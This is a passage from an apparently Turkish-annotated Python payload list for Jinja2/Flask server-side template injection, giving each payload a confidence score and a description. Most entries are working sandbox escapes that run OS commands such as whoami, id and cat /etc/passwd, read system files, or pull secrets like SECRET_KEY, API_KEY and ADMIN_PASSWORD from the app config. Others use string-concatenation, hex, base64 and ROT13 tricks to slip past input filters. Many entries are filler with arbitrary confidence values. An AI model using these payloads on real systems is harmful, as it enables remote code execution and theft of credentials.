    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[119].__init__.__globals__['sys'].modules['os'].system('whoami')}}", "guven": 0.97, "aciklama": "Alt sınıf 119 sistem komutu"},
    
    # Farklı Sınıf Erişim Yolları
    {"payload": "{{{}.__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}", "guven": 0.95, "aciklama": "Dict bases erişimi"},
    {"payload": "{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['os'].system('id')}}", "guven": 0.96, "aciklama": "List base erişimi"},
    {"payload": "{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['sys'].exit()}}", "guven": 0.94, "aciklama": "Tuple bases erişimi"},
    {"payload": "{{set().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['__builtins__']['eval']('1+1')}}", "guven": 0.93, "aciklama": "Set bases erişimi"},
    
    # Import Bypass Teknikleri
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('o'+'s').system('whoami')}}", "guven": 0.96, "aciklama": "String concat import bypass"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__'](''.join(['o','s'])).system('id')}}", "guven": 0.95, "aciklama": "Join import bypass"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os'[::-1][::-1]).system('pwd')}}", "guven": 0.94, "aciklama": "Reverse import bypass"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('OS'.lower()).system('ls')}}", "guven": 0.93, "aciklama": "Lower import bypass"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os'.upper().lower()).system('cat /etc/passwd')}}", "guven": 0.92, "aciklama": "Case manipulation bypass"},
    
    # Encoding Bypass Teknikleri
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('\"\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\"(\"os\").system(\"whoami\")')}}", "guven": 0.97, "aciklama": "Hex encoding bypass"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('chr(95)+chr(95)+\"import\"+chr(95)+chr(95)')}}", "guven": 0.94, "aciklama": "Chr encoding bypass"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('\"\\u005f\\u005f\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u005f\\u005f\"')}}", "guven": 0.93, "aciklama": "Unicode encoding bypass"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('bytes([95,95,105,109,112,111,114,116,95,95]).decode()')}}", "guven": 0.92, "aciklama": "Bytes decode bypass"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('bytearray([111,115]).decode()')}}", "guven": 0.91, "aciklama": "Bytearray decode bypass"},
    
    # Base64 Encoding Bypass
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('base64').b64decode('b3M=').decode()}}", "guven": 0.94, "aciklama": "Base64 decode os"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"base64\").b64decode(\"d2hvYW1p\").decode()')}}", "guven": 0.93, "aciklama": "Base64 whoami command"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['exec']('import base64; exec(base64.b64decode(\"aW1wb3J0IG9zOyBvcy5zeXN0ZW0oIndob2FtaSIp\").decode())')}}", "guven": 0.95, "aciklama": "Base64 exec import"},
    
    # ROT13 Encoding
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('\"bf\".encode().decode(\"rot13\")')}}", "guven": 0.90, "aciklama": "ROT13 os decode"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('bf'.encode().decode('rot13')).system('whoami')}}", "guven": 0.92, "aciklama": "ROT13 import bypass"},
    
    # Attribute Bypass Teknikleri
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__'][chr(95)+chr(95)+'import'+chr(95)+chr(95)]('os').system('id')}}", "guven": 0.95, "aciklama": "Chr attribute bypass"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__im'+'port__']('os').system('whoami')}}", "guven": 0.94, "aciklama": "String concat attribute"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__'][list('__import__')[0]+list('__import__')[1]+list('__import__')[2]+list('__import__')[3]+list('__import__')[4]+list('__import__')[5]+list('__import__')[6]+list('__import__')[7]+list('__import__')[8]+list('__import__')[9]]('os').system('pwd')}}", "guven": 0.91, "aciklama": "List char concat bypass"},
    {"payload": "{{getattr(''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__'],'__import__')('os').system('ls')}}", "guven": 0.93, "aciklama": "Getattr bypass"},
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__'].__getitem__('__import__')('os').system('cat /etc/passwd')}}", "guven": 0.92, "aciklama": "Getitem bypass"},
    
    # Flask Request Manipulation
    {"payload": "{{request.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('whoami')}}", "guven": 0.96, "aciklama": "Request sınıfı OS erişimi"},
    {"payload": "{{request.environ}}", "guven": 0.88, "aciklama": "Request environment variables"},
    {"payload": "{{request.environ['PATH']}}", "guven": 0.87, "aciklama": "PATH environment variable"},
    {"payload": "{{request.environ['HOME']}}", "guven": 0.86, "aciklama": "HOME environment variable"},
    {"payload": "{{request.environ['USER']}}", "guven": 0.85, "aciklama": "USER environment variable"},
    {"payload": "{{request.args}}", "guven": 0.84, "aciklama": "Request arguments"},
    {"payload": "{{request.form}}", "guven": 0.83, "aciklama": "Request form data"},
    {"payload": "{{request.cookies}}", "guven": 0.82, "aciklama": "Request cookies"},
    {"payload": "{{request.headers}}", "guven": 0.81, "aciklama": "Request headers"},
    {"payload": "{{request.files}}", "guven": 0.80, "aciklama": "Request files"},
    
    # Flask Session Manipulation  
    {"payload": "{{session.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')}}", "guven": 0.95, "aciklama": "Session sınıfı import"},
    {"payload": "{{session.keys()}}", "guven": 0.82, "aciklama": "Session anahtarları"},
    {"payload": "{{session.values()}}", "guven": 0.81, "aciklama": "Session değerleri"},
    {"payload": "{{session.items()}}", "guven": 0.80, "aciklama": "Session items"},
    {"payload": "{{session.get('user')}}", "guven": 0.79, "aciklama": "Session user bilgisi"},
    {"payload": "{{session.clear()}}", "guven": 0.85, "aciklama": "Session temizleme"},
    {"payload": "{{session.pop('user')}}", "guven": 0.83, "aciklama": "Session pop işlemi"},
    
    # Flask Config Manipulation
    {"payload": "{{config.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('whoami')}}", "guven": 0.96, "aciklama": "Config sınıfı OS erişimi"},
    {"payload": "{{config.keys()}}", "guven": 0.87, "aciklama": "Config anahtarları"},
    {"payload": "{{config.values()}}", "guven": 0.86, "aciklama": "Config değerleri"},
    {"payload": "{{config.items()}}", "guven": 0.85, "aciklama": "Config items"},
    {"payload": "{{config['SECRET_KEY']}}", "guven": 0.92, "aciklama": "Secret key erişimi"},
    {"payload": "{{config['DATABASE_URL']}}", "guven": 0.90, "aciklama": "Database URL erişimi"},
    {"payload": "{{config['DEBUG']}}", "guven": 0.88, "aciklama": "Debug modu kontrolü"},
    {"payload": "{{config.get('API_KEY')}}", "guven": 0.89, "aciklama": "API key erişimi"},
    {"payload": "{{config.get('ADMIN_PASSWORD')}}", "guven": 0.91, "aciklama": "Admin password erişimi"},
    {"payload": "{{config.update({'DEBUG': True})}}", "guven": 0.87, "aciklama": "Config güncelleme"},
    
    # Flask G Object Manipulation
    {"payload": "{{g.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('1+1')}}", "guven": 0.93, "aciklama": "G object eval"},
    {"payload": "{{g.__dict__}}", "guven": 0.81, "aciklama": "G object dictionary"},
    {"payload": "{{g.get('user')}}", "guven": 0.80, "aciklama": "G object user"},
    {"payload": "{{g.pop('user')}}", "guven": 0.79, "aciklama": "G object pop"},
    {"payload": "{{g.setdefault('admin', True)}}", "guven": 0.82, "aciklama": "G object setdefault"},
    
    # URL_FOR Manipulation
    {"payload": "{{url_for.__globals__['__builtins__']['__import__']('subprocess').call(['whoami'])}}", "guven": 0.95, "aciklama": "URL_FOR subprocess call"},
    {"payload": "{{url_for.__globals__['__builtins__']['eval']('__import__(\"os\").system(\"id\")')}}", "guven": 0.96, "aciklama": "URL_FOR eval OS"},
    {"payload": "{{url_for.__globals__['__builtins__']['exec']('import os; os.system(\"pwd\")')}}", "guven": 0.94, "aciklama": "URL_FOR exec import"},
    {"payload": "{{url_for.__globals__.keys()}}", "guven": 0.85, "aciklama": "URL_FOR globals keys"},
    {"payload": "{{url_for.__globals__.values()}}", "guven": 0.84, "aciklama": "URL_FOR globals values"},
    {"payload": "{{url_for.__name__}}", "guven": 0.80, "aciklama": "URL_FOR function name"},
    {"payload": "{{url_for.__doc__}}", "guven": 0.79, "aciklama": "URL_FOR documentation"},
    {"payload": "{{url_for.__module__}}", "guven": 0.78, "aciklama": "URL_FOR module name"},
    {"payload": "{{url_for.__code__}}", "guven": 0.82, "aciklama": "URL_FOR code object"},
    {"payload": "{{url_for.__code__.co_names}}", "guven": 0.81, "aciklama": "URL_FOR code names"},
    
    # Get_Flashed_Messages Manipulation
    {"payload": "{{get_flashed_messages.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}", "guven": 0.94, "aciklama": "Flash messages OS popen"},
    {"payload": "{{get_flashed_messages.__globals__['__builtins__']['eval']('open(\"/etc/passwd\").read()')}}", "guven": 0.95, "aciklama": "Flash messages file read"},
    {"payload": "{{get_flashed_messages.__globals__.keys()}}", "guven": 0.83, "aciklama": "Flash messages globals keys"},
    {"payload": "{{get_flashed_messages.__name__}}", "guven": 0.79, "aciklama": "Flash messages name"},
    {"payload": "{{get_flashed_messages.__module__}}", "guven": 0.78, "aciklama": "Flash messages module"},
    
    # Lipsum Global Manipulation
    {"payload": "{{lipsum.__globals__['os'].system('whoami')}}", "guven": 0.90, "aciklama": "Lipsum OS system"},
    {"payload": "{{lipsum.__globals__['os'].popen('id').read()}}", "guven": 0.91, "aciklama": "Lipsum OS popen"},
    {"payload": "{{lipsum.__globals__['os'].listdir('/')}}", "guven": 0.88, "aciklama": "Lipsum directory listing"},
    {"payload": "{{lipsum.__globals__['os'].getcwd()}}", "guven": 0.87, "aciklama": "Lipsum current directory"},
    {"payload": "{{lipsum.__globals__['os'].environ}}", "guven": 0.89, "aciklama": "Lipsum environment vars"},
    {"payload": "{{lipsum.__globals__.keys()}}", "guven": 0.82, "aciklama": "Lipsum globals keys"},
    {"payload": "{{lipsum.__globals__['sys']}}", "guven": 0.86, "aciklama": "Lipsum sys module"},
    {"payload": "{{lipsum.__globals__['sys'].version}}", "guven": 0.84, "aciklama": "Lipsum Python version"},
    {"payload": "{{lipsum.__globals__['sys'].path}}", "guven": 0.85, "aciklama": "Lipsum Python path"},
    {"payload": "{{lipsum.__globals__['sys'].modules.keys()}}", "guven": 0.87, "aciklama": "Lipsum loaded modules"},
    
    # Cycler Global Manipulation
    {"payload": "{{cycler.__init__.__globals__['os'].system('id')}}", "guven": 0.89, "aciklama": "Cycler OS system"},
    {"payload": "{{cycler.__init__.__globals__['os'].popen('whoami').read()}}", "guven": 0.90, "aciklama": "Cycler OS popen"},
    {"payload": "{{cycler.__init__.__globals__['os'].listdir('/home')}}", "guven": 0.87, "aciklama": "Cycler home directory"},
    {"payload": "{{cycler.__init__.__globals__.keys()}}", "guven": 0.81, "aciklama": "Cycler globals keys"},
    {"payload": "{{cycler.__init__.__globals__['sys'].executable}}", "guven": 0.85, "aciklama": "Cycler Python executable"},
    {"payload": "{{cycler.__init__.__globals__['sys'].platform}}", "guven": 0.84, "aciklama": "Cycler platform info"},
    {"payload": "{{cycler.__init__.__globals__['__builtins__']}}", "guven": 0.88, "aciklama": "Cycler builtins access"},
    {"payload": "{{cycler.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}", "guven": 0.92, "aciklama": "Cycler file read"},
    {"payload": "{{cycler.__init__.__globals__['__builtins__']['__import__']('subprocess').call(['ls'])}}", "guven": 0.91, "aciklama": "Cycler subprocess"},
    {"payload": "{{cycler.__name__}}", "guven": 0.78, "aciklama": "Cycler class name"},
    
    # Joiner Global Manipulation
    {"payload": "{{joiner.__init__.__globals__['os'].system('pwd')}}", "guven": 0.88, "aciklama": "Joiner OS system"},
    {"payload": "{{joiner.__init__.__globals__['os'].popen('ls -la').read()}}", "guven": 0.89, "aciklama": "Joiner OS popen ls"},
    {"payload": "{{joiner.__init__.__globals__.keys()}}", "guven": 0.80, "aciklama": "Joiner globals keys"},
    {"payload": "{{joiner.__init__.__globals__['sys'].version_info}}", "guven": 0.83, "aciklama": "Joiner Python version info"},
    {"payload": "{{joiner.__init__.__globals__['__builtins__']['eval']('2+2')}}", "guven": 0.86, "aciklama": "Joiner eval matematik"},
    {"payload": "{{joiner.__init__.__globals__['__builtins__']['open']('/proc/version').read()}}", "guven": 0.90, "aciklama": "Joiner kernel version"},
    {"payload": "{{joiner.__init__.__code__}}", "guven": 0.79, "aciklama": "Joiner code object"},
    {"payload": "{{joiner.__init__.__code__.co_varnames}}", "guven": 0.78, "aciklama": "Joiner variable names"},
    {"payload": "{{joiner.__doc__}}", "guven": 0.77, "aciklama": "Joiner documentation"},
    {"payload": "{{joiner.__module__}}", "guven": 0.76, "aciklama": "Joiner module name"},
    
    # Namespace Global Manipulation
    {"payload": "{{namespace.__init__.__globals__['__builtins__']['__import__']('os').system('whoami')}}", "guven": 0.92, "aciklama": "Namespace import OS"},
    {"payload": "{{namespace.__init__.__globals__['__builtins__']['eval']('__import__(\"subprocess\").call([\"id\"])')}}", "guven": 0.93, "aciklama": "Namespace eval subprocess"},
    {"payload": "{{namespace.__init__.__globals__.keys()}}", "guven": 0.81, "aciklama": "Namespace globals keys"},
    {"payload": "{{namespace.__init__.__globals__['sys'].modules['os']}}", "guven": 0.89, "aciklama": "Namespace sys os module"},
    {"payload": "{{namespace.__init__.__globals__['sys'].modules['os'].system('ls')}}", "guven": 0.91, "aciklama": "Namespace os system ls"},
    {"payload": "{{namespace.__dict__}}", "guven": 0.80, "aciklama": "Namespace dictionary"},
    {"payload": "{{namespace.__class__}}", "guven": 0.79, "aciklama": "Namespace class"},
    {"payload": "{{namespace.__class__.__name__}}", "guven": 0.78, "aciklama": "Namespace class name"},
    {"payload": "{{namespace.__class__.__module__}}", "guven": 0.77, "aciklama": "Namespace class module"},
    {"payload": "{{namespace().__dict__}}", "guven": 0.82, "aciklama": "Namespace instance dict"},
    
    # Filter Bypass Teknikleri
    {"payload": "{{''[\"__class__\"]}}", "guven": 0.86, "aciklama": "Bracket notation class"},
    {"payload": "{{''[\"__class__\"][\"__mro__\"]}}", "guven": 0.87, "aciklama": "Bracket notation MRO"},
    {"payload": "{{''[\"__class__\"][\"__mro__\"][1]}}", "guven": 0.88, "aciklama": "Bracket notation base"},
    {"payload": "{{''[\"__class__\"][\"__mro__\"][1][\"__subclasses__\"]()}}", "guven": 0.89, "aciklama": "Bracket notation subclasses"},
    {"payload": "{{''|attr(\"__class__\")}}", "guven": 0.85, "aciklama": "Attr filter class"},
    {"payload": "{{''|attr(\"__class__\")|attr(\"__mro__\")}}", "guven": 0.86, "aciklama": "Attr filter MRO"},
    {"payload": "{{''|attr(\"__class__\")|attr(\"__mro__\")|first|attr(\"__subclasses__\")}}", "guven": 0.88, "aciklama": "Attr filter chain"},
    {"payload": "{{(''|attr('__class__')|attr('__mro__')|list)[1]}}", "guven": 0.87, "aciklama": "Attr filter list index"},
    {"payload": "{{''.__getattribute__(\"__class__\")}}", "guven": 0.84, "aciklama": "Getattribute class"},
    {"payload": "{{''.__getattribute__(\"__class__\").__getattribute__(\"__mro__\")}}", "guven": 0.85, "aciklama": "Getattribute MRO"},
    
    # Jinja2 Loop Variables
    {"payload": "{{loop.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('whoami')}}", "guven": 0.94, "aciklama": "Loop variable OS access"},
    {"payload": "{{loop.index}}", "guven": 0.75, "aciklama": "Loop index"},
    {"payload": "{{loop.index0}}", "guven": 0.74, "aciklama": "Loop index0"},
    {"payload": "{{loop.revindex}}", "guven": 0.73, "aciklama": "Loop reverse index"},
    {"payload": "{{loop.revindex0}}", "guven": 0.72, "aciklama": "Loop reverse index0"},
    {"payload": "{{loop.first}}", "guven": 0.71, "aciklama": "Loop first"},
    {"payload": "{{loop.last}}", "guven": 0.70, "aciklama": "Loop last"},
    {"payload": "{{loop.length}}", "guven": 0.69, "aciklama": "Loop length"},
    {"payload": "{{loop.cycle}}", "guven": 0.76, "aciklama": "Loop cycle"},
    {"payload": "{{loop.depth}}", "guven": 0.68, "aciklama": "Loop depth"},
    
    # Super Function
    {"payload": "{{super().__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('whoami')}}", "guven": 0.93, "aciklama": "Super function OS access"},
    {"payload": "{{super().__thisclass__}}", "guven": 0.80, "aciklama": "Super thisclass"},
    {"payload": "{{super().__self_class__}}", "guven": 0.79, "aciklama": "Super self class"},
    {"payload": "{{super().__self__}}", "guven": 0.78, "aciklama": "Super self"},
    
    # Range Function Exploitation
    {"payload": "{{range.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('id')}}", "guven": 0.92, "aciklama": "Range class OS access"},
    {"payload": "{{range(10).__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('1+1')}}", "guven": 0.90, "aciklama": "Range instance eval"},
    {"payload": "{{range.__doc__}}", "guven": 0.75, "aciklama": "Range documentation"},
    {"payload": "{{range.__name__}}", "guven": 0.74, "aciklama": "Range name"},
    {"payload": "{{range.__module__}}", "guven": 0.73, "aciklama": "Range module"},
    
    # Dict Function Exploitation
    {"payload": "{{dict.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('whoami')}}", "guven": 0.91, "aciklama": "Dict class OS access"},
    {"payload": "{{dict().__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')}}", "guven": 0.92, "aciklama": "Dict instance import"},
    {"payload": "{{dict.fromkeys}}", "guven": 0.76, "aciklama": "Dict fromkeys method"},
    {"payload": "{{dict.keys}}", "guven": 0.75, "aciklama": "Dict keys method"},
    {"payload": "{{dict.values}}", "guven": 0.74, "aciklama": "Dict values method"},
    {"payload": "{{dict.items}}", "guven": 0.73, "aciklama": "Dict items method"},
    {"payload": "{{dict.get}}", "guven": 0.72, "aciklama": "Dict get method"},
    {"payload": "{{dict.pop}}", "guven": 0.71, "aciklama": "Dict pop method"},
    {"payload": "{{dict.update}}", "guven": 0.70, "aciklama": "Dict update method"},
    {"payload": "{{dict.clear}}", "guven": 0.69, "aciklama": "Dict clear method"},
    
    # List Function Exploitation
    {"payload": "{{list.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('pwd')}}", "guven": 0.90, "aciklama": "List class OS access"},
    {"payload": "{{list().__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('2*2')}}", "guven": 0.89, "aciklama": "List instance eval"},
    {"payload": "{{list.append}}", "guven": 0.74, "aciklama": "List append method"},
    {"payload": "{{list.extend}}", "guven": 0.73, "aciklama": "List extend method"},
    {"payload": "{{list.insert}}", "guven": 0.72, "aciklama": "List insert method"},
    {"payload": "{{list.remove}}", "guven": 0.71, "aciklama": "List remove method"},
    {"payload": "{{list.pop}}", "guven": 0.70, "aciklama": "List pop method"},
    {"payload": "{{list.clear}}", "guven": 0.69, "aciklama": "List clear method"},
    {"payload": "{{list.index}}", "guven": 0.68, "aciklama": "List index method"},
    {"payload": "{{list.count}}", "guven": 0.67, "aciklama": "List count method"},
    
    # Tuple Function Exploitation
    {"payload": "{{tuple.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('ls')}}", "guven": 0.89, "aciklama": "Tuple class OS access"},
    {"payload": "{{tuple().__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}", "guven": 0.91, "aciklama": "Tuple instance file read"},
    {"payload": "{{tuple.count}}", "guven": 0.72, "aciklama": "Tuple count method"},
    {"payload": "{{tuple.index}}", "guven": 0.71, "aciklama": "Tuple index method"},
    
    # Set Function Exploitation
    {"payload": "{{set.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('cat /etc/passwd')}}", "guven": 0.88, "aciklama": "Set class OS access"},
    {"payload": "{{set().__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('subprocess').call(['whoami'])}}", "guven": 0.90, "aciklama": "Set instance subprocess"},
    {"payload": "{{set.add}}", "guven": 0.70, "aciklama": "Set add method"},
    {"payload": "{{set.remove}}", "guven": 0.69, "aciklama": "Set remove method"},
    {"payload": "{{set.discard}}", "guven": 0.68, "aciklama": "Set discard method"},
    {"payload": "{{set.pop}}", "guven": 0.67, "aciklama": "Set pop method"},
    {"payload": "{{set.clear}}", "guven": 0.66, "aciklama": "Set clear method"},
    {"payload": "{{set.union}}", "guven": 0.65, "aciklama": "Set union method"},
    {"payload": "{{set.intersection}}", "guven": 0.64, "aciklama": "Set intersection method"},
    {"payload": "{{set.difference}}", "guven": 0.63, "aciklama": "Set difference method"},
    
    # Frozenset Function Exploitation
    {"payload": "{{frozenset.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('uname -a')}}", "guven": 0.87, "aciklama": "Frozenset class OS access"},
    {"payload": "{{frozenset().__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('3*3')}}", "guven": 0.85, "aciklama": "Frozenset instance eval"},
    {"payload": "{{frozenset.union}}", "guven": 0.64, "aciklama": "Frozenset union method"},
    {"payload": "{{frozenset.intersection}}", "guven": 0.63, "aciklama": "Frozenset intersection method"},
    {"payload": "{{frozenset.difference}}", "guven": 0.62, "aciklama": "Frozenset difference method"},
    {"payload": "{{frozenset.symmetric_difference}}", "guven": 0.61, "aciklama": "Frozenset symmetric difference"},
    {"payload": "{{frozenset.issubset}}", "guven": 0.60, "aciklama": "Frozenset issubset method"},
    {"payload": "{{frozenset.issuperset}}", "guven": 0.59, "aciklama": "Frozenset issuperset method"},
    {"payload": "{{frozenset.isdisjoint}}", "guven": 0.58, "aciklama": "Frozenset isdisjoint method"},
    {"payload": "{{frozenset.copy}}", "guven": 0.57, "aciklama": "Frozenset copy method"},
    
    # Complex Number Exploitation
    {"payload": "{{complex.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('ps aux')}}", "guven": 0.86, "aciklama": "Complex class OS access"},
    {"payload": "{{complex(1,2).__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('netstat -an')}}", "guven": 0.88, "aciklama": "Complex instance import"},
    {"payload": "{{complex.real}}", "guven": 0.65, "aciklama": "Complex real attribute"},
    {"payload": "{{complex.imag}}", "guven": 0.64, "aciklama": "Complex imag attribute"},
    {"payload": "{{complex.conjugate}}", "guven": 0.63, "aciklama": "Complex conjugate method"},
    
    # Bool Function Exploitation
    {"payload": "{{bool.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('df -h')}}", "guven": 0.85, "aciklama": "Bool class OS access"},
    {"payload": "{{bool(True).__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('4*4')}}", "guven": 0.84, "aciklama": "Bool instance eval"},
    
    # Float Function Exploitation
    {"payload": "{{float.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('mount')}}", "guven": 0.83, "aciklama": "Float class OS access"},
    {"payload": "{{float(3.14).__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('/proc/cpuinfo').read()}}", "guven": 0.86, "aciklama": "Float instance file read"},
    {"payload": "{{float.is_integer}}", "guven": 0.62, "aciklama": "Float is_integer method"},
    {"payload": "{{float.as_integer_ratio}}", "guven": 0.61, "aciklama": "Float as_integer_ratio"},
    {"payload": "{{float.hex}}", "guven": 0.60, "aciklama": "Float hex method"},
    {"payload": "{{float.fromhex}}", "guven": 0.59, "aciklama": "Float fromhex method"},
    
    # Int Function Exploitation
    {"payload": "{{int.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('free -m')}}", "guven": 0.82, "aciklama": "Int class OS access"},
    {"payload": "{{int(42).__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('platform').system()}}", "guven": 0.84, "aciklama": "Int instance platform"},
    {"payload": "{{int.bit_length}}", "guven": 0.58, "aciklama": "Int bit_length method"},
    {"payload": "{{int.to_bytes}}", "guven": 0.57, "aciklama": "Int to_bytes method"},
    {"payload": "{{int.from_bytes}}", "guven": 0.56, "aciklama": "Int from_bytes method"},
    
    # Bytes Function Exploitation
    {"payload": "{{bytes.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('lscpu')}}", "guven": 0.81, "aciklama": "Bytes class OS access"},
    {"payload": "{{bytes(b'test').__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('5*5')}}", "guven": 0.83, "aciklama": "Bytes instance eval"},
    {"payload": "{{bytes.decode}}", "guven": 0.70, "aciklama": "Bytes decode method"},
    {"payload": "{{bytes.hex}}", "guven": 0.69, "aciklama": "Bytes hex method"},
    {"payload": "{{bytes.fromhex}}", "guven": 0.68, "aciklama": "Bytes fromhex method"},
    {"payload": "{{bytes.split}}", "guven": 0.67, "aciklama": "Bytes split method"},
    {"payload": "{{bytes.join}}", "guven": 0.66, "aciklama": "Bytes join method"},
    {"payload": "{{bytes.replace}}", "guven": 0.65, "aciklama": "Bytes replace method"},
    {"payload": "{{bytes.find}}", "guven": 0.64, "aciklama": "Bytes find method"},
    {"payload": "{{bytes.count}}", "guven": 0.63, "aciklama": "Bytes count method"},
    
    # Bytearray Function Exploitation
    {"payload": "{{bytearray.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('vmstat')}}", "guven": 0.80, "aciklama": "Bytearray class OS access"},
    {"payload": "{{bytearray(b'test').__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('/proc/meminfo').read()}}", "guven": 0.85, "aciklama": "Bytearray instance file read"},
    {"payload": "{{bytearray.decode}}", "guven": 0.69, "aciklama": "Bytearray decode method"},
    {"payload": "{{bytearray.hex}}", "guven": 0.68, "aciklama": "Bytearray hex method"},
    {"payload": "{{bytearray.fromhex}}", "guven": 0.67, "aciklama": "Bytearray fromhex method"},
    {"payload": "{{bytearray.append}}", "guven": 0.66, "aciklama": "Bytearray append method"},
    {"payload": "{{bytearray.extend}}", "guven": 0.65, "aciklama": "Bytearray extend method"},
    {"payload": "{{bytearray.insert}}", "guven": 0.64, "aciklama": "Bytearray insert method"},
    {"payload": "{{bytearray.remove}}", "guven": 0.63, "aciklama": "Bytearray remove method"},
    {"payload": "{{bytearray.pop}}", "guven": 0.62, "aciklama": "Bytearray pop method"},
    
    # Memory View Exploitation
    {"payload": "{{memoryview.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('iostat')}}", "guven": 0.79, "aciklama": "Memoryview class OS access"},
    {"payload": "{{memoryview(b'test').__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('socket').gethostname()}}", "guven": 0.82, "aciklama": "Memoryview hostname"},
    {"payload": "{{memoryview.tobytes}}", "guven": 0.61, "aciklama": "Memoryview tobytes method"},
    {"payload": "{{memoryview.tolist}}", "guven": 0.60, "aciklama": "Memoryview tolist method"},
    {"payload": "{{memoryview.hex}}", "guven": 0.59, "aciklama": "Memoryview hex method"},
    {"payload": "{{memoryview.cast}}", "guven": 0.58, "aciklama": "Memoryview cast method"},
    
    # Property Exploitation
    {"payload": "{{property.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('uptime')}}", "guven": 0.78, "aciklama": "Property class OS access"},
    {"payload": "{{property(lambda x: x).__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('6*6')}}", "guven": 0.81, "aciklama": "Property instance eval"},
    {"payload": "{{property.fget}}", "guven": 0.57, "aciklama": "Property fget attribute"},
    {"payload": "{{property.fset}}", "guven": 0.56, "aciklama": "Property fset attribute"},
    {"payload": "{{property.fdel}}", "guven": 0.55, "aciklama": "Property fdel attribute"},
    {"payload": "{{property.__doc__}}", "guven": 0.54, "aciklama": "Property doc attribute"},
    
    # Staticmethod Exploitation
    {"payload": "{{staticmethod.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('last')}}", "guven": 0.77, "aciklama": "Staticmethod class OS access"},
